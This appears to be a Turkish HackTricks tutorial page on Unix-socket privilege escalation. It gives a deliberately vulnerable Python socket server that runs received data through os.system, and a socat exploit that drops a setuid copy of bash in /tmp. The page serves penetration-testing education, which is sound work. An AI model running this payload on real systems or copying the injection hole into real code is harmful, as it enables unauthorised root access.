<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzdaki özel [**NFT'leri**](https://opensea.io/collection/the-peass-family) keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek paylaşın.

</details>


## Python ile Soket Bağlama Örneği

Aşağıdaki örnekte, bir **unix soketi** (`/tmp/socket_test.s`) oluşturulur ve alınan her şey `os.system` tarafından **çalıştırılır**. Bunu gerçek dünyada bulamayacağınızı biliyorum, ancak bu örneğin amacı, unix soketlerini kullanan bir kodun nasıl göründüğünü ve en kötü durumda girişi nasıl yöneteceğinizi görmektir.

{% code title="s.py" %}
```python
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
{% endcode %}

Kodu python kullanarak çalıştırın: `python s.py` ve **soketin nasıl dinlediğini kontrol edin**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit** (Sömürü)

Bir sistemdeki güvenlik açıklarını kullanarak yetkilendirme düzeyini yükseltmek veya hedef sisteme izinsiz erişim sağlamak için kullanılan bir tekniktir. Sistemdeki zayıf noktaları hedefleyerek, saldırganlar bu açıkları kullanarak hedef sistemi ele geçirebilir veya kontrol edebilirler. Sömürü, genellikle bir yazılım hatasını veya konfigürasyon hatasını hedef alır ve saldırganlara hedef sisteme erişim sağlama imkanı verir. Sömürü teknikleri, saldırganların hedef sistemi ele geçirmek veya yetkilendirme düzeyini yükseltmek için kullanabilecekleri çeşitli yöntemleri içerir. Bu yöntemler arasında buffer overflow, SQL enjeksiyonu, komut enjeksiyonu ve kimlik avı gibi teknikler bulunur. Sömürü, siber saldırganların hedef sistemdeki hassas verilere erişim sağlamasına ve kontrolünü ele geçirmesine olanak tanır. Bu nedenle, sistemlerin güvenliğini sağlamak için güncellemelerin düzenli olarak yapılması ve güvenlik açıklarının düzeltilmesi önemlidir.
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINA**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi HackTricks ve HackTricks Cloud** github depolarına **PR göndererek paylaşın**.

</details>
